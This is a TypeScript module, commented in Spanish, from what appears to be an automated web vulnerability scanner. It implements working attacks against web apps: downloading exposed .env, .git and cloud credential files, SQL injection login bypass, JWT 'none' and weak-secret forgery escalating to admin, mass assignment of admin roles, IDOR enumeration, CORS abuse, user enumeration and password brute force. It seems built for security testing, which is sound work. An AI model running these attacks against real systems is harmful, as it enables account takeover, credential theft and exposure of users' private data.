/**
 * Ataques del plugin genérico. Cada uno confirma solo con evidencia real del
 * tráfico (datos ajenos, firma válida, rol cambiado…), nunca por el status solo:
 * una SPA responde 200 a todo y eso no es un hallazgo.
 */
import { createHmac } from 'node:crypto';
import { decodeJwt, reqLine, type RecordedResponse } from '../../core/http.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../../core/types.ts';
import { CATALOG } from './catalog.ts';
import { findKey, isHtml, isJson, isReal, LOGIN_RE, type Endpoint, type GenericState, type Session } from './surface.ts';

const PII_KEY = /^(email|e_?mail|phone|telefono|password(_?hash)?|passwordHash|hash|ssn|rut|dni|address|direccion|card(_?number)?|api_?key|secret|token)$/i;
const OWNER_KEY = /^(user_?id|userId|owner(_?id)?|ownerId|author_?id|authorId|created_?by|createdBy|customer_?id|customerId|account_?id|accountId|uid)$/;
const SQL_ERR = /(SQL syntax|syntax error at or near|unterminated quoted string|SQLITE_ERROR|sqlite3\.OperationalError|SQLSTATE\[|ORA-\d{5}|PG::SyntaxError|QueryFailedError|SequelizeDatabaseError|ER_PARSE_ERROR|Unclosed quotation mark|quoted string not properly terminated|psycopg2\.errors|pymysql\.err|near "[^"]*": syntax error|"code"\s*:\s*"42[0-9A-Z]{3}"|operator is not unique)/i;
const STACK_RE = /((?:\n|\\n)\s+at [\w$.<>[\] ]+ \(?[^)\n"]*:\d+:\d+\)?|Traceback \(most recent call last\)|File "[^"]+\.py", line \d+|\bat [\w$.<>]+ \((?:\/|[A-Z]:\\)[^)]+\.(?:js|ts|mjs|cjs):\d+:\d+\))/;
const RATE_LIMITED = /too many|rate.?limit|locked|bloquead|demasiados|try again later|intenta m[aá]s tarde/i;
const COMMON_PASSWORDS = ['123456', 'password', '12345678', 'qwerty', 'qwerty123', '123456789', '111111', 'admin', 'admin123', 'password1', 'abc123', 'letmein', 'welcome', 'iloveyou', 'Password1', '1234567890'];
const COMMON_JWT_SECRETS = [
  'secret', 'changeme', 'change-me', 'change_me', 'jwt_secret', 'jwtsecret', 'jwt-secret', 'JWT_SECRET', 'your-secret-key', 'your_jwt_secret',
  'your-256-bit-secret', 'supersecret', 'super-secret', 'secretkey', 'secret-key', 'secret_key', 'mysecret', 'my-secret', 'my_secret',
  'dev', 'development', 'test', 'default', 'password', '123456', 'keyboard cat', 'shhhhh', 's3cr3t', 'secret123', 'topsecret', 'hack26', 'mayday',
];

function step(technique: string, mitre: string[], res: RecordedResponse | null, summary: string, note?: string): AttackStep {
  return {
    technique,
    mitre,
    request: res ? reqLine(res.exchange.method, res.exchange.path) : '—',
    response_summary: summary,
    exchange: res?.exchange,
    note,
  };
}

function base(id: string): Pick<AttackResult, 'vuln_id' | 'blocked' | 'steps' | 'gained' | 'attacker_active'> {
  return { vuln_id: id, blocked: false, steps: [], gained: [], attacker_active: false };
}

function records(json: unknown): Record<string, unknown>[] {
  if (Array.isArray(json)) return json.filter((x) => x && typeof x === 'object') as Record<string, unknown>[];
  if (json && typeof json === 'object') {
    for (const k of ['data', 'items', 'results', 'rows', 'users', 'records']) {
      const v = (json as Record<string, unknown>)[k];
      if (Array.isArray(v)) return records(v);
    }
    return Object.keys(json).length >= 2 ? [json as Record<string, unknown>] : [];
  }
  return [];
}

function piiFields(rows: Record<string, unknown>[]): string[] {
  const keys = new Set<string>();
  for (const r of rows.slice(0, 5)) for (const k of Object.keys(r)) if (PII_KEY.test(k) && r[k] != null && r[k] !== '') keys.add(k);
  return [...keys];
}

function message(res: RecordedResponse): string {
  const m = findKey(res.json, /^(message|error|detail|msg|errors?)$/i);
  return String(m ?? (isHtml(res) ? '' : res.text.slice(0, 200))).replace(/\d+/g, '#').trim().toLowerCase();
}

function b64url(o: unknown): string {
  return Buffer.from(JSON.stringify(o)).toString('base64url');
}

const SENSITIVE_PATH = /(user|account|customer|client|order|payment|invoice|billing|admin|export|member|patient|employee|transaction|report|message|note|document|secret|key|token|config|setting|private|wallet|address)/i;
const ADMIN_PATH = /\/(admin|internal|manage|management|backoffice|staff|superuser)(\/|$)|\/export\b/i;

export function buildAttacks(state: GenericState): Attack[] {
  const leaked: string[] = [];

  const exposedFiles: Attack = {
    meta: CATALOG['exposed-sensitive-files'],
    mutating: false,
    scheduling: { alarmFootprint: 'low' },
    async run(ctx) {
      const r = base('exposed-sensitive-files');
      const files: Array<{ path: string; ok: (t: string) => boolean }> = [
        ...['/.env', '/.env.local', '/.env.production', '/.env.development'].map((path) => ({
          path,
          ok: (t: string) => (t.match(/^[A-Z][A-Z0-9_]{2,}\s*=.*$/gm) ?? []).length >= 2,
        })),
        { path: '/.git/config', ok: (t) => /\[core\]|\[remote "/.test(t) },
        { path: '/.git/HEAD', ok: (t) => /^ref: refs\//.test(t) },
        { path: '/docker-compose.yml', ok: (t) => /^services:\s*$/m.test(t) },
        ...['/backup.sql', '/dump.sql', '/db.sql'].map((path) => ({ path, ok: (t: string) => /(CREATE TABLE|INSERT INTO)/i.test(t) })),
        { path: '/.aws/credentials', ok: (t) => /aws_access_key_id/i.test(t) },
        { path: '/config.json', ok: (t) => /"(password|secret|api_?key|database_?url)"\s*:/i.test(t) },
      ];
      const found: string[] = [];
      for (const f of files) {
        const res = await ctx.http.get(f.path, { noRedirect: true });
        if (res.status !== 200 || isHtml(res) || !f.ok(res.text)) continue;
        found.push(f.path);
        const keys = [...res.text.matchAll(/^([A-Z][A-Z0-9_]{2,})\s*=\s*(.*)$/gm)];
        for (const [, k, v] of keys) if (/SECRET|JWT|KEY|TOKEN/.test(k) && v.trim()) leaked.push(v.trim().replace(/^['"]|['"]$/g, ''));
        // Evidencia sin los valores: solo los nombres de las variables.
        const masked = { ...res.exchange, resBodyExcerpt: res.exchange.resBodyExcerpt.replace(/=(.*)$/gm, '=<redactado>').replace(/(url = ).*/g, '$1<redactado>') };
        r.steps.push({
          technique: 'Descarga de archivos de configuración publicados',
          mitre: ['T1552.001'],
          request: reqLine('GET', f.path),
          response_summary: keys.length
            ? `HTTP 200 — ${keys.length} variable(s): ${keys.slice(0, 6).map((k) => k[1]).join(', ')}${keys.length > 6 ? '…' : ''}`
            : `HTTP 200 — ${f.path} completo`,
          exchange: masked,
        });
      }
      const confirmed = found.length > 0;
      return {
        ...r,
        confirmed,
        gained: confirmed ? [`archivos expuestos: ${found.join(', ')}`] : [],
        foothold: confirmed ? { type: 'data', detail: `secretos en ${found.join(', ')}` } : undefined,
        summary: confirmed
          ? `Se descargaron ${found.join(', ')} desde internet${leaked.length ? ` con ${leaked.length} secreto(s) de firma o llaves` : ''}.`
          : 'No hay .env, .git ni respaldos publicados en la raíz.',
      };
    },
  };

  const sqlInjection: Attack = {
    meta: CATALOG['sql-injection'],
    mutating: false,
    scheduling: { alarmFootprint: 'high' },
    async run(ctx) {
      const r = base('sql-injection');
      const surf = await state.surface(ctx);
      const s = await state.session(ctx);
      const auth = state.auth(s);

      // 1. Bypass del login: ' OR '1'='1' --
      for (const p of (await state.loginPaths(ctx)).slice(0, 6)) {
        const probe = await ctx.http.post(p, { email: 'nadie@ejemplo.cl', password: 'x' }, { noRedirect: true });
        if (!isReal(probe, surf.fallback)) continue;
        for (const field of ['email', 'username']) {
          const res = await ctx.http.post(p, { [field]: "' OR '1'='1' -- ", password: "' OR '1'='1' -- " }, { noRedirect: true });
          const tok = res.status >= 200 && res.status < 300 && findKey(res.json, /^(access_?token|accessToken|token|jwt)$/i);
          if (tok) {
            const ep = surf.endpoints.find((e) => e.path === p);
            if (ep?.ref) state.refs.set('sql-injection', ep.ref);
            r.steps.push(step("Bypass del login con ' OR '1'='1' --", ['T1190', 'T1078'], res, `HTTP ${res.status} — sesión emitida sin contraseña`));
            return {
              ...r,
              confirmed: true,
              confidence: 0.97,
              gained: ['sesión sin contraseña (bypass del login por SQLi)'],
              foothold: { type: 'account', detail: 'login sin contraseña por inyección SQL' },
              attacker_active: true,
              summary: `Inyección SQL en ${p}: con ' OR '1'='1' -- el login entrega una sesión sin conocer la contraseña.`,
            };
          }
        }
        break;
      }

      // 2. Error-based: comilla en parámetros de búsqueda y de ruta.
      const targets: Array<{ ep: Endpoint; good: string; bad: string; balanced?: string }> = [];
      // Primero los endpoints cuyo archivo tiene SQL armado a mano (señal raw-sql del discovery).
      const rawSqlFiles = new Set((state.input.repo?.signals ?? []).filter((x) => x.kind === 'raw-sql').map((x) => x.ref.file));
      const rank = (e: Endpoint) => (e.ref && rawSqlFiles.has(e.ref.file) ? 2 : 0) + (e.live ? 1 : 0);
      const lists = surf.endpoints.filter((e) => e.method === 'GET' && !e.params.length).sort((a, b) => rank(b) - rank(a));
      for (const ep of lists.slice(0, 6)) {
        for (const k of ['q', 'search', 'query', 'filter', 'name']) {
          targets.push({ ep, good: `${ep.path}?${k}=test`, bad: `${ep.path}?${k}=${encodeURIComponent("test'")}`, balanced: `${ep.path}?${k}=${encodeURIComponent("test''")}` });
        }
      }
      for (const ep of surf.endpoints.filter((e) => e.method === 'GET' && e.params.length === 1).slice(0, 6)) {
        targets.push({ ep, good: ep.path, bad: ep.path.replace(/1(?=[^1]*$)/, encodeURIComponent("1'")) });
      }
      for (const t of targets.slice(0, 40)) {
        const bad = await ctx.http.get(t.bad, { ...auth, noRedirect: true });
        const signature = SQL_ERR.test(bad.text);
        if (!signature && !(bad.status >= 500 && t.balanced)) continue;
        const good = await ctx.http.get(t.good, { ...auth, noRedirect: true });
        if (SQL_ERR.test(good.text) || good.status >= 400) continue;
        // Sin firma conocida: comillas balanceadas. Si '' funciona y ' rompe, la comilla
        // cambia la estructura del SQL (con queries parametrizadas ambas serían solo texto).
        let balanced: RecordedResponse | null = null;
        if (!signature) {
          balanced = await ctx.http.get(t.balanced!, { ...auth, noRedirect: true });
          if (balanced.status >= 400 || SQL_ERR.test(balanced.text)) continue;
        }
        if (t.ep.ref) state.refs.set('sql-injection', t.ep.ref);
        const err = SQL_ERR.exec(bad.text)?.[0] ?? (findKey(bad.json, /^(error|message)$/i) as string | undefined) ?? `HTTP ${bad.status}`;
        r.steps.push(step('Comilla simple en un parámetro (error-based)', ['T1190'], bad, `HTTP ${bad.status} — la consulta se rompe: "${String(err).slice(0, 80)}"`));
        if (balanced) r.steps.push(step("Comillas balanceadas ('')", ['T1190'], balanced, `HTTP ${balanced.status} — con dos comillas vuelve a funcionar`));
        r.steps.push(step('Mismo request sin comilla (control)', ['T1190'], good, `HTTP ${good.status} — sin error: el input llega crudo al SQL`));
        return {
          ...r,
          confirmed: true,
          confidence: 0.85,
          gained: ['confirmación de inyectabilidad: la consulta se arma con el input'],
          foothold: { type: 'db', detail: `consulta inyectable en ${t.ep.template}` },
          summary: `Inyección SQL en ${t.ep.template}: una comilla rompe la consulta ("${err}") y sin ella funciona.`,
        };
      }
      return { ...r, confirmed: false, summary: `Ningún parámetro probado (${targets.length}) rompió una consulta SQL ni el login aceptó la inyección.` };
    },
  };

  const jwtForgery: Attack = {
    meta: CATALOG['jwt-forgery'],
    mutating: false,
    scheduling: { dependsOn: ['exposed-sensitive-files'], alarmFootprint: 'low' },
    async run(ctx) {
      const r = base('jwt-forgery');
      const s = await state.session(ctx);
      const parts = s?.token?.split('.') ?? [];
      if (!s?.token || parts.length !== 3) return { ...r, confirmed: false, summary: 'La sesión no usa JWT: no aplica.' };
      let header: { alg?: string } | null = null;
      try {
        header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
      } catch {
        /* cabecera ilegible */
      }
      const claims = decodeJwt(s.token) ?? {};
      const me = await state.me(ctx, s);

      // a) alg "none": token sin firma.
      if (me) {
        const none = `${b64url({ alg: 'none', typ: 'JWT' })}.${parts[1]}.`;
        const res = await ctx.http.get(me.path, { token: none, noRedirect: true });
        if (res.status === 200 && isJson(res)) {
          r.steps.push(step('Token con alg "none" (sin firma)', ['T1606'], res, `HTTP 200 — el servidor aceptó un JWT sin firma`));
          return {
            ...r,
            confirmed: true,
            confidence: 0.95,
            gained: ['tokens de cualquier usuario sin conocer el secreto'],
            foothold: { type: 'jwt', detail: 'JWT con alg none aceptado' },
            attacker_active: true,
            summary: 'El servidor acepta JWT con alg "none": el atacante firma sus propios tokens como cualquier usuario.',
          };
        }
      }

      // b) secreto débil: verificación local de la firma, sin requests.
      const alg = String(header?.alg ?? 'HS256');
      const hmac = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' }[alg];
      if (!hmac) return { ...r, confirmed: false, summary: `JWT firmado con ${alg} (asimétrico): no se prueba fuerza bruta del secreto.` };
      // Re-verificación de solo esta vuln: leer el .env público por cuenta propia.
      if (!leaked.length) {
        for (const p of ['/.env', '/.env.production']) {
          const res = await ctx.http.get(p, { noRedirect: true });
          if (res.status !== 200 || isHtml(res)) continue;
          for (const [, k, v] of res.text.matchAll(/^([A-Z][A-Z0-9_]{2,})\s*=\s*(.*)$/gm)) {
            if (/SECRET|JWT|KEY|TOKEN/.test(k) && v.trim()) leaked.push(v.trim().replace(/^['"]|['"]$/g, ''));
          }
        }
      }
      const candidates = [...new Set([...leaked, ...state.input.repoSecrets, ...COMMON_JWT_SECRETS])];
      const secret = candidates.find((c) => createHmac(hmac, c).update(`${parts[0]}.${parts[1]}`).digest('base64url') === parts[2]);
      if (!secret) return { ...r, confirmed: false, summary: `El secreto del JWT no está entre ${candidates.length} candidatos comunes ni filtrados.` };
      const origin = leaked.includes(secret) ? 'filtrado en un archivo público' : state.input.repoSecrets.includes(secret) ? 'escrito en el repositorio' : 'de diccionario';
      r.steps.push({
        technique: 'Fuerza bruta offline del secreto del JWT',
        mitre: ['T1606', 'T1110.002'],
        request: 'offline: HMAC del token de la sesión',
        response_summary: `firma válida con un secreto ${origin} (${secret.length} caracteres)`,
      });
      // Token forjado: mismo usuario, rol admin si el token lleva rol.
      const forgedClaims = { ...claims, ...('role' in claims ? { role: 'admin' } : {}), ...('isAdmin' in claims ? { isAdmin: true } : {}) };
      const h = b64url({ alg, typ: 'JWT' });
      const p = b64url(forgedClaims);
      const forged = `${h}.${p}.${createHmac(hmac, secret).update(`${h}.${p}`).digest('base64url')}`;
      let admin = false;
      if (me) {
        const res = await ctx.http.get(me.path, { token: forged, noRedirect: true });
        admin = res.status === 200 && /admin/i.test(String(findKey(res.json, /^role$/i) ?? ''));
        r.steps.push(step('Request con un token forjado', ['T1606'], res, `HTTP ${res.status} — ${res.status === 200 ? `aceptado${admin ? ' con rol admin' : ''}` : 'rechazado'}`));
      }
      return {
        ...r,
        confirmed: true,
        confidence: 0.98,
        gained: [`secreto del JWT (${origin})`, admin ? 'token forjado con rol admin aceptado' : 'tokens forjados de cualquier usuario'],
        foothold: { type: admin ? 'admin' : 'jwt', detail: `secreto del JWT ${origin}` },
        attacker_active: true,
        summary: `El secreto que firma los JWT es ${origin}: el atacante firma tokens válidos de cualquier usuario${admin ? ', incluso con rol admin' : ''}.`,
      };
    },
  };

  const massAssignment: Attack = {
    meta: CATALOG['mass-assignment'],
    mutating: true,
    scheduling: { alarmFootprint: 'medium' },
    async run(ctx) {
      const r = base('mass-assignment');
      const ROLE_FIELDS = { role: 'admin', isAdmin: true, is_admin: true, admin: true, roles: ['admin'] };
      const s = await state.register(ctx, ROLE_FIELDS);
      if (!s) return { ...r, confirmed: false, summary: 'No se encontró un registro abierto donde probar campos extra.' };
      const surf = await state.surface(ctx);
      const adminView = async (token?: string) => {
        const me = await state.me(ctx, s);
        const claims = (token ?? s.token) ? decodeJwt((token ?? s.token)!) : null;
        const view = { ...(claims ?? {}), ...(me?.body ?? {}) };
        const role = String(findKey(view, /^role$/i) ?? '');
        const roles = (view as { roles?: unknown }).roles;
        const admin = /admin/i.test(role) || findKey(view, /^(isAdmin|is_admin|admin)$/) === true || (Array.isArray(roles) && roles.some((x) => /admin/i.test(String(x))));
        return { admin, role, me };
      };

      // a) Alta con campos de rol.
      let v = await adminView();
      let how = `POST ${s.registeredAt ?? '(registro)'}`;
      let ep = surf.endpoints.find((e) => e.method === 'POST' && e.path === s.registeredAt);
      r.steps.push({
        technique: 'Registro con campos de rol en el body (mass assignment)',
        mitre: ['T1098'],
        request: `${how} { …, "role": "admin", "isAdmin": true }`,
        response_summary: v.admin ? `cuenta creada con rol ${v.role || 'admin'}` : `cuenta creada con rol ${v.role || 'normal'}: el alta ignoró los campos extra`,
      });

      // b) Editar el propio perfil con campos de rol (la cuenta es la desechable).
      if (!v.admin && v.me) {
        for (const method of ['PATCH', 'PUT']) {
          const res = await ctx.http.request({ method, path: v.me.path, body: ROLE_FIELDS, ...state.auth(s), noRedirect: true });
          if (res.status >= 400 || !isReal(res, surf.fallback)) continue;
          // Si el servidor reemite el token, usar el nuevo.
          const fresh = findKey(res.json, /^(access_?token|accessToken|token|jwt)$/i);
          if (typeof fresh === 'string' && fresh.length > 16) s.token = fresh;
          v = await adminView();
          how = `${method} ${v.me?.path ?? ''}`;
          ep = surf.endpoints.find((e) => e.method === method && e.path === v.me?.path) ?? ep;
          r.steps.push(step('Edición del propio perfil con campos de rol', ['T1098'], res, v.admin ? `HTTP ${res.status} — el rol quedó en ${v.role || 'admin'}` : `HTTP ${res.status} — el rol no cambió`));
          break;
        }
      }
      if (ep?.ref) state.refs.set('mass-assignment', ep.ref);
      return {
        ...r,
        confirmed: v.admin,
        confidence: v.admin ? 0.97 : undefined,
        gained: v.admin ? ['cuenta propia con rol admin'] : [],
        foothold: v.admin ? { type: 'admin', detail: `cuenta ${s.email} con rol admin` } : undefined,
        attacker_active: v.admin,
        summary: v.admin
          ? `${how} guarda el body completo: la cuenta ${s.email} quedó con rol admin.`
          : 'Ni el registro ni la edición del perfil aceptan role/isAdmin: no hay mass assignment.',
      };
    },
  };

  const adminNoAuthz: Attack = {
    meta: CATALOG['admin-endpoint-no-authz'],
    mutating: false,
    scheduling: { alarmFootprint: 'medium' },
    async run(ctx) {
      const r = base('admin-endpoint-no-authz');
      const surf = await state.surface(ctx);
      const s = await state.session(ctx);
      if (s?.role && /admin/i.test(s.role)) return { ...r, confirmed: false, summary: 'La sesión disponible ya es admin: no sirve para probar la escalada.' };
      const eps = surf.endpoints.filter((e) => e.method === 'GET' && ADMIN_PATH.test(e.template)).slice(0, 8);
      if (!eps.length) return { ...r, confirmed: false, summary: 'No se encontraron rutas de administración.' };
      let denied = 0;
      for (const ep of eps) {
        const res = await ctx.http.get(ep.path, { ...state.auth(s), noRedirect: true });
        if (res.status === 401 || res.status === 403) denied++;
        if (res.status !== 200 || !isJson(res) || !records(res.json).length) continue;
        if (ep.ref) state.refs.set('admin-endpoint-no-authz', ep.ref);
        r.steps.push(step(`GET a la API de admin ${s ? 'como usuario normal' : 'sin sesión'}`, ['T1078'], res, `HTTP 200 — ${records(res.json).length} registro(s) de ${ep.template}`));
        return {
          ...r,
          confirmed: true,
          confidence: 0.9,
          gained: [`acceso a ${ep.template} sin rol admin`],
          foothold: { type: 'data', detail: `datos de ${ep.template}` },
          summary: `${ep.template} responde datos a ${s ? 'un usuario sin rol admin' : 'cualquiera sin sesión'}: no verifica el rol.`,
        };
      }
      return { ...r, confirmed: false, blocked: denied > 0, summary: `${eps.length} ruta(s) de admin probadas: ${denied} negaron el acceso, ninguna devolvió datos.` };
    },
  };

  const unauthData: Attack = {
    meta: CATALOG['unauthenticated-data-access'],
    mutating: false,
    scheduling: { alarmFootprint: 'low' },
    async run(ctx) {
      const r = base('unauthenticated-data-access');
      const surf = await state.surface(ctx);
      const eps = surf.endpoints
        .filter((e) => e.method === 'GET' && !LOGIN_RE.test(e.template) && (SENSITIVE_PATH.test(e.template) || e.auth === 'user' || e.auth === 'admin'))
        .slice(0, 15);
      for (const ep of eps) {
        const res = await ctx.http.get(ep.path, { noRedirect: true });
        if (res.status !== 200 || !isJson(res)) continue;
        const rows = records(res.json);
        const pii = piiFields(rows);
        const protectedInCode = ep.auth === 'user' || ep.auth === 'admin';
        if (!rows.length || (!pii.length && !protectedInCode)) continue;
        if (ep.ref) state.refs.set('unauthenticated-data-access', ep.ref);
        r.steps.push(step('Request sin sesión a un endpoint de datos', ['T1213'], res, `HTTP 200 sin token — ${rows.length} registro(s)${pii.length ? ` con ${pii.join(', ')}` : ''}`));
        return {
          ...r,
          confirmed: true,
          confidence: pii.length ? 0.92 : 0.8,
          gained: [`${rows.length} registro(s) de ${ep.template} sin autenticarse`],
          foothold: { type: 'data', detail: `datos de ${ep.template}` },
          data_exfiltrated: { table: ep.template, rows: rows.length, sample: pii },
          summary: `${ep.template} entrega ${rows.length} registro(s)${pii.length ? ` con ${pii.join(', ')}` : ''} a cualquiera, sin sesión.`,
        };
      }
      return { ...r, confirmed: false, summary: `${eps.length} endpoint(s) de datos probados sin sesión: ninguno entregó datos privados.` };
    },
  };

  const idor: Attack = {
    meta: CATALOG['idor'],
    mutating: false,
    scheduling: { alarmFootprint: 'medium' },
    async run(ctx) {
      const r = base('idor');
      const surf = await state.surface(ctx);
      const s = await state.session(ctx);
      if (!s) return { ...r, confirmed: false, summary: 'Sin sesión de usuario no se puede probar acceso a datos ajenos.' };
      await state.me(ctx, s);
      const mine = s.userId === undefined ? undefined : String(s.userId);
      if (mine === undefined) return { ...r, confirmed: false, summary: 'No se pudo saber el ID del usuario atacante para comparar dueños.' };
      const eps = surf.endpoints
        .filter((e) => e.method === 'GET' && e.params.length === 1 && /\/:\w+$/.test(e.template) && !/\/(me|profile)\b/.test(e.template))
        .slice(0, 4);
      for (const ep of eps) {
        const userLike = /\/(users?|accounts?|profiles?|customers?|members?)\/:\w+$/i.test(ep.template);
        const foreign: Array<{ id: number; owner: string }> = [];
        let firstRes: RecordedResponse | null = null;
        for (let id = 1; id <= 12 && foreign.length < 5; id++) {
          if (String(id) === mine) continue;
          const path = ep.template.replace(/:\w+$/, String(id));
          const res = await ctx.http.get(path, { ...state.auth(s), noRedirect: true });
          if (res.status !== 200 || !res.json || typeof res.json !== 'object' || Array.isArray(res.json)) continue;
          const obj = res.json as Record<string, unknown>;
          const owner = findKey(obj, OWNER_KEY);
          const objId = findKey(obj, /^(id|_id)$/);
          const isForeign = owner !== undefined ? String(owner) !== mine : userLike && objId !== undefined && String(objId) !== mine && piiFields([obj]).length > 0;
          if (!isForeign) continue;
          foreign.push({ id, owner: String(owner ?? objId) });
          firstRes ??= res;
        }
        if (!foreign.length) continue;
        if (ep.ref) state.refs.set('idor', ep.ref);
        r.steps.push(step('Enumeración de IDs (IDOR)', ['T1213'], firstRes, `HTTP 200 — recurso de otro usuario (dueño ${foreign[0].owner}, el atacante es ${mine})`));
        return {
          ...r,
          confirmed: true,
          confidence: 0.93,
          gained: [`${foreign.length} recurso(s) ajeno(s) en ${ep.template}`],
          foothold: { type: 'data', detail: `${foreign.length} registros ajenos de ${ep.template}` },
          data_exfiltrated: { table: ep.template, rows: foreign.length, sample: foreign.map((f) => ({ id: f.id, owner: f.owner })) },
          summary: `Cambiando el ID en ${ep.template} el atacante lee ${foreign.length} recurso(s) de otros usuarios.`,
        };
      }
      return { ...r, confirmed: false, summary: `${eps.length} endpoint(s) con ID probados: ninguno devolvió recursos de otros usuarios.` };
    },
  };

  const cors: Attack = {
    meta: CATALOG['cors-misconfiguration'],
    mutating: false,
    scheduling: { alarmFootprint: 'low' },
    async run(ctx) {
      const r = base('cors-misconfiguration');
      const s = await state.session(ctx);
      const me = s ? await state.me(ctx, s) : null;
      const surf = await state.surface(ctx);
      const path = me?.path ?? surf.endpoints.find((e) => e.method === 'GET' && e.live)?.path ?? '/';
      for (const origin of ['https://evil-mayday.example', 'null']) {
        const res = await ctx.http.get(path, { ...state.auth(s), headers: { origin }, noRedirect: true });
        const acao = res.headers['access-control-allow-origin'];
        const creds = res.headers['access-control-allow-credentials'] === 'true';
        if (acao === origin && creds) {
          r.steps.push(step(`Request desde el origen ${origin}`, ['T1539'], res, `Access-Control-Allow-Origin: ${acao} + Allow-Credentials: true`));
          return {
            ...r,
            confirmed: true,
            confidence: 0.9,
            gained: ['lectura de la cuenta de la víctima desde un sitio ajeno'],
            foothold: { type: 'data', detail: 'CORS reflejado con credenciales' },
            summary: `La API refleja cualquier Origin (${origin}) con credenciales: un sitio malicioso lee ${path} con la sesión de la víctima.`,
          };
        }
      }
      return { ...r, confirmed: false, summary: 'La API no refleja orígenes ajenos con credenciales.' };
    },
  };

  const verboseErrors: Attack = {
    meta: CATALOG['verbose-errors'],
    mutating: false,
    scheduling: { alarmFootprint: 'medium' },
    async run(ctx) {
      const r = base('verbose-errors');
      const surf = await state.surface(ctx);
      const s = await state.session(ctx);
      const posts = surf.endpoints.filter((e) => e.method === 'POST' || e.method === 'PUT' || e.method === 'PATCH').slice(0, 6);
      const tries: Array<{ ep?: Endpoint; send: () => Promise<RecordedResponse> }> = [
        ...posts.map((ep) => ({ ep, send: () => ctx.http.request({ method: ep.method, path: ep.path, rawBody: '{"a":', headers: { 'content-type': 'application/json' }, ...state.auth(s), noRedirect: true }) })),
        ...surf.endpoints.filter((e) => e.method === 'GET' && e.params.length).slice(0, 4).map((ep) => ({ ep, send: () => ctx.http.get(ep.template.replace(/:\w+/g, '%25%27%22'), { ...state.auth(s), noRedirect: true }) })),
      ];
      for (const t of tries) {
        const res = await t.send();
        if (!STACK_RE.test(res.text)) continue;
        if (t.ep?.ref) state.refs.set('verbose-errors', t.ep.ref);
        r.steps.push(step('Request malformado para provocar un error', ['T1592'], res, `HTTP ${res.status} — la respuesta trae el stack trace del servidor`));
        return {
          ...r,
          confirmed: true,
          confidence: 0.9,
          gained: ['stack trace con rutas de archivos y versiones'],
          summary: `Un request malformado a ${t.ep?.template ?? 'la API'} devuelve el stack trace completo al cliente.`,
        };
      }
      return { ...r, confirmed: false, summary: `${tries.length} request(s) malformados: ninguno filtró stack traces.` };
    },
  };

  const userEnum: Attack = {
    meta: CATALOG['user-enumeration'],
    mutating: false,
    scheduling: { alarmFootprint: 'low' },
    async run(ctx) {
      const r = base('user-enumeration');
      const s = await state.session(ctx);
      if (!s?.loginPath) return { ...r, confirmed: false, summary: 'No se encontró el login con una cuenta conocida para comparar respuestas.' };
      const known = await ctx.http.post(s.loginPath, { [s.idField]: s.email, password: 'Incorrecta-123!' }, { noRedirect: true });
      const ghostId = s.idField === 'email' ? `no-existe-${Date.now()}@ejemplo.cl` : `no_existe_${Date.now()}`;
      const ghost = await ctx.http.post(s.loginPath, { [s.idField]: ghostId, password: 'Incorrecta-123!' }, { noRedirect: true });
      const differs = known.status !== ghost.status || message(known) !== message(ghost);
      if (!differs) return { ...r, confirmed: false, summary: 'El login responde igual para una cuenta que existe y una que no.' };
      r.steps.push(step('Login con un usuario que existe y contraseña incorrecta', ['T1589.002'], known, `HTTP ${known.status} — "${message(known).slice(0, 60)}"`));
      r.steps.push(step('Login con un usuario que no existe', ['T1589.002'], ghost, `HTTP ${ghost.status} — "${message(ghost).slice(0, 60)}"`));
      return {
        ...r,
        confirmed: true,
        confidence: 0.85,
        gained: ['forma de saber qué usuarios existen'],
        summary: `El login responde distinto si el usuario existe (HTTP ${known.status}) o no (HTTP ${ghost.status}): se pueden enumerar cuentas.`,
      };
    },
  };

  const otherIds = () => attacks.filter((a) => a.meta.id !== 'weak-password-no-rate-limit').map((a) => a.meta.id);
  const bruteForce: Attack = {
    meta: CATALOG['weak-password-no-rate-limit'],
    mutating: false,
    // Último: la ráfaga de logins podría bloquear la cuenta que usan los demás.
    get scheduling() {
      return { dependsOn: otherIds(), alarmFootprint: 'high' as const };
    },
    async run(ctx) {
      const r = base('weak-password-no-rate-limit');
      const s = await state.session(ctx);
      if (!s?.loginPath) return { ...r, confirmed: false, summary: 'No se encontró un login con una cuenta conocida para probar el límite de intentos.' };
      const surf = await state.surface(ctx);
      const ep = surf.endpoints.find((e) => e.path === s.loginPath);
      const wordlist = COMMON_PASSWORDS.filter((p) => p !== s.password).slice(0, 12);
      let last: RecordedResponse | null = null;
      for (const pw of wordlist) {
        const res = await ctx.http.post(s.loginPath, { [s.idField]: s.email, password: pw }, { noRedirect: true });
        last = res;
        if (res.status === 429 || RATE_LIMITED.test(res.text)) {
          r.steps.push(step('Ráfaga de contraseñas comunes', ['T1110.001'], res, `HTTP ${res.status} — el servidor frenó los intentos`));
          return { ...r, confirmed: false, blocked: true, summary: `El login bloquea tras ${wordlist.indexOf(pw) + 1} intentos: hay rate limit.` };
        }
      }
      const guessed = COMMON_PASSWORDS.includes(s.password);
      const final = await ctx.http.post(s.loginPath, { [s.idField]: s.email, password: s.password }, { noRedirect: true });
      const ok = final.status >= 200 && final.status < 300;
      if (!ok) return { ...r, confirmed: false, blocked: true, summary: 'Tras la ráfaga la cuenta ya no entra: hay bloqueo por intentos.' };
      if (ep?.ref) state.refs.set('weak-password-no-rate-limit', ep.ref);
      r.steps.push(step(`Ráfaga de ${wordlist.length} contraseñas comunes`, ['T1110.001'], last, `HTTP ${last?.status} en todos — sin rate limit ni bloqueo`));
      r.steps.push(step(guessed ? 'Contraseña adivinada del diccionario' : 'Login válido después de la ráfaga', ['T1110.001', 'T1078'], final, `HTTP ${final.status} — sesión emitida`));
      return {
        ...r,
        confirmed: true,
        confidence: guessed ? 0.97 : 0.85,
        gained: guessed ? [`cuenta ${s.email} con contraseña de diccionario`] : ['fuerza bruta sin límite contra cualquier cuenta'],
        foothold: guessed ? { type: 'account', detail: `sesión de ${s.email}` } : undefined,
        attacker_active: guessed,
        summary: guessed
          ? `El login acepta ${wordlist.length + 1} intentos seguidos sin frenar y la contraseña de ${s.email} está en el diccionario.`
          : `El login acepta ${wordlist.length + 1} intentos seguidos sin rate limit ni bloqueo de cuenta.`,
      };
    },
  };

  const attacks: Attack[] = [exposedFiles, sqlInjection, jwtForgery, massAssignment, adminNoAuthz, unauthData, idor, cors, bruteForce, userEnum, verboseErrors];
  return attacks;
}
